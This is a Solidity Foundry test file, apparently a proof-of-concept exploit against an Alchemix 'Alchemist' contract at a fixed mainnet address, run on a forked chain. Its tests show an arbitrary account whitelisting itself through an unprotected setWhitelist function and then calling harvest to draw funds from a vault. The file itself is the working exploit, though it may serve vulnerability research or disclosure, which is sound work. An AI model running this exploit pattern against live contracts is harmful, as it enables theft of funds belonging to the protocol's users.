// SPDX-License-Identifier: UNLICENSED
// forge test --match-test testingHarvestingFunds --fork-url=$ETH_RPC_URL --fork-block-number=12644671 -vv
pragma solidity ^0.8.13;

import "@forge-std/Test.sol";
import "@forge-std/Vm.sol";
import "@forge-std/console.sol";

// This allows us to call functions on the Alchemy contract
interface IAlchemist {
    function balanceOf(address) external view returns (uint256);
    function setWhitelist(address[] calldata accounts, bool[] calldata flags) external;
    function whitelist(address account) external returns (bool);
    function harvest(uint256 _vaultId) external returns (uint256, uint256);
}

contract AlchemistPoc is Test {
    IAlchemist alchemist = IAlchemist(0x6B566554378477490ab040f6F757171c967D03ab);
    // EOA address
    address constant myAddress = address(1337);

    function setUp() public {
        vm.deal(myAddress, 5 ether);
    }

    function testSettingWhitelist() public {
        vm.startPrank(myAddress);
        assertFalse(alchemist.whitelist(myAddress));
        address[] memory a = new address[](1);
        bool[] memory b = new bool[](1);
        a[0] = myAddress;
        b[0] = true;
        alchemist.setWhitelist(a, b);
        assert(alchemist.whitelist(myAddress));
    }

    function testingHarvestingFunds() public {
        vm.startPrank(myAddress);
        assertFalse(alchemist.whitelist(myAddress));
        address[] memory a = new address[](1);
        bool[] memory b = new bool[](1);
        a[0] = myAddress;
        b[0] = true;
        alchemist.setWhitelist(a, b);
        assertEq(alchemist.whitelist(myAddress), true);
        (uint256 h, uint256 d) = alchemist.harvest(0);
        emit log_named_uint("Harvested:", h);
        emit log_named_uint("Decreased:", d);
        assert(h>0);
    }
}
